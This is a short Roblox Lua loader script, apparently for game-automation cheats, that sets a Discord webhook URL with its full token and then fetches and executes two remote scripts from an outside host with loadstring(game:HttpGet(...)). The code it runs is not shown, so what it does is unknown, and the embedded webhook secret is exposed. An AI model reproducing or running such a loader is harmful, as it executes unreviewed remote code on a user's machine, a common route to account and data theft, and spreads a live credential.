--// Loader Rev. 1.0.4
getgenv().Config = {
    Webhook = "https://discord.com/api/webhooks/1362284955241021440/ISVUyf5Aws3G7sT1uMbxbUvB4fyEGvDqTq7DtQwqe11-qERRUoYG0zCcOQytzlFbjgC9",
    ScriptURL = "https://russia.1ms.network/rblx/webhook.lua",
    AntiAFKURL = "https://russia.1ms.network/rblx/antiafk.lua",
}

print("Starting: Hatching Scripts")
loadstring(game:HttpGet(getgenv().Config.ScriptURL))()
loadstring(game:HttpGet(getgenv().Config.AntiAFKURL))()
